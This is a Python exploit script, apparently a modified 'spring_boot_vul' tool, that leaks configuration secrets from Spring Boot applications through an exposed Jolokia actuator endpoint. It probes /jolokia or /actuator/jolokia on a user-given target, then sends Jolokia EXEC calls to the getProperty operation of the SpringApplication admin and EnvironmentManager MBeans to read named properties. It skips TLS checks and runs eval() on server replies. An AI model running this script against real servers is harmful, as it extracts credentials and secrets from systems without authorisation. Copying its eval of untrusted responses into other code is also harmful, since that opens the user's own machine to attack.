import requests
import argparse
import urllib3
import json
urllib3.disable_warnings()
requests.packages.urllib3.disable_warnings()

headers = {
    'User-Agnet':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0',
    'Content-Type':'application/json'
}

def check_jolokia_exists(url, version):
    if version == 1:
        url = url + '/jolokia'
    else:
        url = url + '/actuator/jolokia'
    rsp = requests.get(url=url, headers=headers, allow_redirects=False, verify=False, timeout=10)
    if rsp.status_code == 404:
        print('[-] Jolokia not exists!\n')
        return False
    return True

class InfoLeaker(object):
    def __init__(self, url, info, version):
        self.url = url
        self.info = info
        self.version = version

    def get_by_jolokia(self):
        print('[+] Get By Jolokia...')
        if not check_jolokia_exists(self.url, self.version):
            return
        json_boot = {
            "mbean": "org.springframework.boot:name=SpringApplication,type=Admin",
            "operation": "getProperty",
            "type": "EXEC",
            "arguments": [self.info]
        }

        json_cloud = {
            "mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager",
            "operation": "getProperty",
            "type": "EXEC",
            "arguments": [self.info]
        }

        if version == 1:
            url = self.url + '/jolokia'
        else:
            url = self.url + '/actuator/jolokia'
        
        try:
            rsp_boot = requests.post(url=url, json=json_boot, headers=headers, allow_redirects=False, verify=False, timeout=10)
            while rsp_boot.status_code == 500:
                print('[-] boot exp status code is 500, now is repost...')
                rsp_boot = requests.post(url=url, json=json_boot, headers=headers, allow_redirects=False, verify=False, timeout=10)
            rsp_cloud = requests.post(url=url, json=json_cloud, headers=headers, allow_redirects=False, verify=False, timeout=10)
            while rsp_cloud.status_code == 500:
                print('[-] cloud exp status code is 500, now is repost...')
                rsp_cloud = requests.post(url=url, json=json_cloud, headers=headers, allow_redirects=False, verify=False, timeout=10)
            if 'value' in rsp_boot.text:
                print('[+] success!\n')
                print(eval(rsp_boot.text)['value'])
            elif 'value' in rsp_cloud.text:
                print('[+] success!\n')
                print(eval(rsp_cloud.text)['value'])
            else:
                print('[-] failed\n')
                print('[-] boot exp status code: ' + rsp_boot.status_code + '\n' + rsp_boot.text + '\n')
                print('[-] cloud exp status code: ' + rsp_cloud.status_code + '\n' + rsp_cloud.text)
        except Exception as e:
            print (e)

if __name__ == '__main__':
    print('''
-----------------------------------------------
spring_boot_vul script modify by LuckyEast >_< 
-----------------------------------------------
''')
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', dest='url', help='target url: http://127.0.0.1')
    parser.add_argument('-v', '--version', dest='version', help='input 1/2, 2 is /actuator/xxx')
    parser.add_argument('-i', '--info', dest='info', help='info to leak', default='')

    args = parser.parse_args()
    url = args.url
    info = args.info
    version = int(args.version)

    print('[+] Trying to leak info...')
    leaker = InfoLeaker(url, info, version)
    leaker.get_by_jolokia()



